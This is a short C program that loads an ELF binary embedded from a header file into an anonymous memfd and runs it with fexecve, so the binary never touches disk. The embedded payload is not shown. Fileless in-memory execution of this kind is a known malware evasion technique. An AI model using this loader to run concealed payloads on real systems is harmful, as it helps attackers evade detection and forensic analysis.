#include "pkg/elf_sc.h"
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>

int main() {

    // Create a file descriptor in memory
    int anon_elf_fd = memfd_create("", MFD_CLOEXEC);
    if (anon_elf_fd == -1) {
        perror("memfd_create");
        return EXIT_FAILURE;
    }

    // Write our elf into the file descriptor in memory
    write(anon_elf_fd, elf, elf_len);

    // Prepare arguments
    char *const argv[] = {NULL};
    char *const envp[] = {NULL};

    // fexecve the elf
    if (fexecve(anon_elf_fd, argv, envp) == -1) {
        perror("fexecve");
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}